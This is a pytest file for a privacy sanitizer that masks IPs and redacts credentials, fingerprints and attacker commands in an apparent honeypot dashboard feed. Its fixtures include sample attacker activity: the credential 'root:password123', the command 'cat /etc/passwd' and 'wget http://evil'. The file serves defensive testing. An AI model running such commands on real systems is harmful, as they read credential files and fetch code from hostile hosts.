from scripts.public_feed_privacy import sanitize_public_payload, mask_ip, is_public_indicator_ip


def test_ip_classification_and_masking():
    assert is_public_indicator_ip("8.8.8.8") is True
    assert is_public_indicator_ip("127.0.0.1") is False
    assert is_public_indicator_ip("172.18.0.4") is False
    assert mask_ip("8.8.8.8") == "8.8.*.*"


def test_public_payload_is_sanitized_by_default():
    payload = {
        "top_ips": [{"ip": "8.8.8.8", "count": 10}, {"ip": "127.0.0.1", "count": 99}],
        "blocked_ips": [{"ip": "1.1.1.1", "attempts": 5}],
        "monitored_ips": [{"ip": "8.8.8.8", "attempts": 10}],
        "top_creds": [{"cred": "root:password123", "count": 2}],
        "top_passwords": [{"password": "password123", "count": 2}],
        "top_pass": "password123",
        "profiles": [
            {
                "ip": "8.8.8.8",
                "dna": "abc",
                "bio_hash": "def",
                "classification": "Scanner",
            },
            {
                "ip": "172.18.0.4",
                "classification": "Internal",
            },
        ],
        "replay_sessions": [
            {
                "ip": "8.8.8.8",
                "commands": [{"command": "cat /etc/passwd", "time": "2026-04-01T00:00:00Z"}],
            }
        ],
        "recent_events": [
            {
                "timestamp": "2026-04-01T00:00:00Z",
                "type": "AUTH_LOGIN",
                "ip": "8.8.8.8",
                "message": "Login attempt: root:password123 from 8.8.8.8",
                "details": "{\"password\":\"password123\"}",
            },
            {
                "timestamp": "2026-04-01T00:00:01Z",
                "type": "AUTH_LOGIN",
                "ip": "127.0.0.1",
                "message": "internal",
                "details": "internal",
            },
        ],
        "globe_points": [{"ip": "8.8.8.8", "lat": 0, "lng": 0}],
    }

    sanitized = sanitize_public_payload(payload)

    assert sanitized["top_ips"] == [{"ip": "8.8.*.*", "count": 10}]
    assert sanitized["blocked_ips"] == [{"ip": "1.1.*.*", "attempts": 5}]
    assert sanitized["top_creds"] == [{"cred": "root:[redacted]", "count": 2}]
    assert sanitized["top_passwords"][0]["password"].startswith("pa")
    assert sanitized["top_pass"].startswith("pa")
    assert sanitized["profiles"][0]["ip"] == "8.8.*.*"
    assert "dna" not in sanitized["profiles"][0]
    assert "bio_hash" not in sanitized["profiles"][0]
    assert sanitized["replay_sessions"] == []
    assert len(sanitized["recent_events"]) == 1
    assert sanitized["recent_events"][0]["ip"] == "8.8.*.*"
    assert "[redacted]" in sanitized["recent_events"][0]["message"]
    assert sanitized["recent_events"][0]["details"] == ""
    assert sanitized["privacy_mode"] == "sanitized"


def test_replay_can_be_included_with_redacted_commands():
    payload = {
        "replay_sessions": [
            {
                "ip": "9.9.9.9",
                "commands": [{"command": "wget http://evil", "time": "2026-04-01T00:00:00Z"}],
            }
        ],
        "top_ips": [],
        "blocked_ips": [],
        "monitored_ips": [],
        "profiles": [],
        "top_creds": [],
        "top_passwords": [],
        "recent_events": [],
        "globe_points": [],
    }

    sanitized = sanitize_public_payload(payload, include_replay=True)
    assert len(sanitized["replay_sessions"]) == 1
    assert sanitized["replay_sessions"][0]["ip"] == "9.9.*.*"
    assert sanitized["replay_sessions"][0]["commands"][0]["command"] == "[redacted-command]"
